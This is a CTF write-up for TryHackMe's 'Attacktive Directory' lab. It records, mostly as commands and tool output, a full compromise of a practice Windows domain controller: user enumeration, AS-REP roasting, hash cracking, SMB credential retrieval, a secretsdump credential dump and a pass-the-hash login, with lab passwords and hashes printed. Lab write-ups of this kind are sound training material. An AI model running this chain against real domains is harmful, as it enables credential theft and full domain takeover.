# Nmap

```bash
# Nmap 7.94SVN scan initiated Wed Nov 27 16:19:36 2024 as: /usr/lib/nmap/nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49669,49670,49671,49673,49677,49683,49691,49697 -sCV -A -T4 -O -oN scans/service-scan 10.10.48.130
Nmap scan report for 10.10.48.130
Host is up (0.045s latency).
PORT STATE SERVICE VERSION
53/tcp open domain Simple DNS Plus
80/tcp open http Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_ Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-27 15:19:43Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp open microsoft-ds?
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open tcpwrapped
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open tcpwrapped
3389/tcp open ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
| Target_Name: THM-AD
| NetBIOS_Domain_Name: THM-AD
| NetBIOS_Computer_Name: ATTACKTIVEDIREC
| DNS_Domain_Name: spookysec.local
| DNS_Computer_Name: AttacktiveDirectory.spookysec.local
| Product_Version: 10.0.17763
|_ System_Time: 2024-11-27T15:20:35+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2024-11-26T15:12:48
|_Not valid after: 2025-05-28T15:12:48
|_ssl-date: 2024-11-27T15:20:44+00:00; 0s from scanner time.
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open mc-nmf .NET Message Framing
47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open msrpc Microsoft Windows RPC
49665/tcp open msrpc Microsoft Windows RPC
49666/tcp open msrpc Microsoft Windows RPC
49669/tcp open msrpc Microsoft Windows RPC
49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
49671/tcp open msrpc Microsoft Windows RPC
49673/tcp open msrpc Microsoft Windows RPC
49677/tcp open msrpc Microsoft Windows RPC
49683/tcp open msrpc Microsoft Windows RPC
49691/tcp open msrpc Microsoft Windows RPC
49697/tcp open msrpc Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled and required
| smb2-time:
| date: 2024-11-27T15:20:37
|_ start_date: N/A
TRACEROUTE (using port 53/tcp)
HOP RTT ADDRESS
1 47.01 ms 10.11.0.1
2 47.72 ms 10.10.48.130
OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
# Nmap done at Wed Nov 27 16:20:45 2024 -- 1 IP address (1 host up) scanned in 69.20 seconds
```

# Collected info

- Domain: spookysec.local (Nmap)
- Name: THM-AD (enum4linux)
- Users:
	```text
	james@spookysec.local
	svc-admin@spookysec.local:management2005
	James@spookysec.local
	robin@spookysec.local
	darkstar@spookysec.local
	administrator@spookysec.local
	backup@spookysec.local:backup2517860
	paradox@spookysec.local
	JAMES@spookysec.local
	Robin@spookysec.local
	Administrator@spookysec.local
	Darkstar@spookysec.local
	Paradox@spookysec.local
	DARKSTAR@spookysec.local
	ori@spookysec.local
	ROBIN@spookysec.local
	```

# Foothold

With enum4linux: `enum4linux -a 10.10.114.150
- Name: THM-AD

With **[Kerbrute]([https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute))** and a username wordlist we extract a bunch of valid usernames:

```bash
┌──(kali㉿kali)-[/Shared/Resources]
└─$ ./kerbrute_linux_amd64 userenum --dc 10.10.114.150 -d spookysec.local /Shared/CTFs/Tryhackme/AttacktiveDirectory/userlist.txt
__ __ __
/ /_____ _____/ /_ _______ __/ /____
/ //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
/ ,< / __/ / / /_/ / / / /_/ / /_/ __/
/_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 11/29/24 - Ronnie Flathers @ropnop
2024/11/29 11:41:11 > Using KDC(s):
2024/11/29 11:41:11 > 10.10.114.150:88
2024/11/29 11:41:11 > [+] VALID USERNAME: james@spookysec.local
2024/11/29 11:41:12 > [+] VALID USERNAME: svc-admin@spookysec.local
2024/11/29 11:41:13 > [+] VALID USERNAME: James@spookysec.local
2024/11/29 11:41:13 > [+] VALID USERNAME: robin@spookysec.local
2024/11/29 11:41:17 > [+] VALID USERNAME: darkstar@spookysec.local
2024/11/29 11:41:19 > [+] VALID USERNAME: administrator@spookysec.local
2024/11/29 11:41:24 > [+] VALID USERNAME: backup@spookysec.local
2024/11/29 11:41:26 > [+] VALID USERNAME: paradox@spookysec.local
2024/11/29 11:41:39 > [+] VALID USERNAME: JAMES@spookysec.local
2024/11/29 11:41:43 > [+] VALID USERNAME: Robin@spookysec.local
2024/11/29 11:42:10 > [+] VALID USERNAME: Administrator@spookysec.local
2024/11/29 11:43:03 > [+] VALID USERNAME: Darkstar@spookysec.local
2024/11/29 11:43:20 > [+] VALID USERNAME: Paradox@spookysec.local
2024/11/29 11:44:17 > [+] VALID USERNAME: DARKSTAR@spookysec.local
2024/11/29 11:44:34 > [+] VALID USERNAME: ori@spookysec.local
2024/11/29 11:45:05 > [+] VALID USERNAME: ROBIN@spookysec.local
2024/11/29 11:46:17 > Done! Tested 73317 usernames (16 valid) in 306.154 seconds
```

With valid users we perform AS-REP Roasting to find users with disabled Kerberos preauthentication users and we find a ticket for user `svc-admin@spookysec.local`:

```bash
┌──(kali㉿kali)-[/Shared/CTFs/Tryhackme/AttacktiveDirectory]
└─$ impacket-GetNPUsers -dc-ip 10.10.114.150 spookysec.local/ -usersfile valid-usernames -format hashcat -outputfile hashes.asreproast
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User james@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:3723cf11a1c7ced089b2aaf01d534497$3c38222c44860f02b22f485ed6edd5547c3e54edffe60b886a35b80c5df80f1f8b741657d9f02b05495c30de606a2c15762e07b5bbd4148c43289f674a0e32219b43111e1ef727d1452629ee8ad967d4f345566252aba3d0d718a1d879faa21ded75bbccaade19c53f2c50cfe4421db1b5af6c0c80f964657442938319608a9a8c821ea5edc81f1f48accc6b073946f049be0f6b9b78a2c9e2ad9c3271c6646c89abe84e65f27b2e71de699086c379a5dc4bd02f8dc7b40f344b3024f77c9b465c42f9933f66026b9363be622df4d527d00da206bcbf2bbaf3b671e3de5d1b0d4b7f8c0afa711c4cb57e95d5ba3bf219fe4f
[-] User James@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JAMES@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Robin@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darkstar@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Paradox@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DARKSTAR@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ori@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ROBIN@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
```

And we crack the password with hashcat: management2005`

```bash
┌──(kali㉿kali)-[/Shared/CTFs/Tryhackme/AttacktiveDirectory]
└─$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
$krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:3723cf11a1c7ced089b2aaf01d534497$3c38222c44860f02b22f485ed6edd5547c3e54edffe60b886a35b80c5df80f1f8b741657d9f02b05495c30de606a2c15762e07b5bbd4148c43289f674a0e32219b43111e1ef727d1452629ee8ad967d4f345566252aba3d0d718a1d879faa21ded75bbccaade19c53f2c50cfe4421db1b5af6c0c80f964657442938319608a9a8c821ea5edc81f1f48accc6b073946f049be0f6b9b78a2c9e2ad9c3271c6646c89abe84e65f27b2e71de699086c379a5dc4bd02f8dc7b40f344b3024f77c9b465c42f9933f66026b9363be622df4d527d00da206bcbf2bbaf3b671e3de5d1b0d4b7f8c0afa711c4cb57e95d5ba3bf219fe4f:management2005
```

Now with smbmap we find that we have smb access:

```bash
┌──(kali㉿kali)-[/Shared/CTFs/Tryhackme/AttacktiveDirectory]
└─$ smbmap -u svc-admin -p management2005 -d spookysec.local -H 10.10.114.150
________ ___ ___ _______ ___ ___ __ _______
/" )|" \ /" || _ "\ |" \ /" | /""\ | __ "\
(: \___/ \ \ // |(. |_) :) \ \ // | / \ (. |__) :)
\___ \ /\ \/. ||: \/ /\ \/. | /' /\ \ |: ____/
__/ \ |: \. |(| _ \ |: \. | // __' \ (| /
/" \ :) |. \ /: ||: |_) :)|. \ /: | / / \ \ /|__/ \
(_______/ |___|\__/|___|(_______/ |___|\__/|___|(___/ \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
[https://github.com/ShawnDEvans/smbmap](https://github.com/ShawnDEvans/smbmap)
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)
[+] IP: 10.10.114.150:445 Name: 10.10.114.150 Status: Authenticated
Disk Permissions Comment
---- ----------- -------
ADMIN$ NO ACCESS Remote Admin
backup READ ONLY
C$ NO ACCESS Default share
IPC$ READ ONLY Remote IPC
NETLOGON READ ONLY Logon server share
SYSVOL READ ONLY Logon server share
[*] Closed 1 connections
```

And we find with smbclient a file called `backup_credentials.txt` with is base64 encoded credentials for backup user
```bash
┌──(kali㉿kali)-[/Shared/CTFs/Tryhackme/AttacktiveDirectory]
└─$ smbclient -U "svc-admin" //10.10.114.150/backup
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
. D 0 Sat Apr 4 21:08:39 2020
.. D 0 Sat Apr 4 21:08:39 2020
backup_credentials.txt A 48 Sat Apr 4 21:08:53 2020
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
┌──(kali㉿kali)-[/Shared/CTFs/Tryhackme/AttacktiveDirectory]
└─$ cat backup_credentials.txt | base64 -d
backup@spookysec.local:backup2517860
```

With secretsdump we can dump hashes and we get the administrator AD
```bash
┌──(kali㉿kali)-[/Shared/temp]
└─$ impacket-secretsdump -dc-ip 10.10.222.233 spookysec/backup:backup2517860@10.10.222.233
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
...
```

We try pass the hash with rdp but not working, but evil-winrm does:
`evil-winrm -i 10.10.222.233 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc`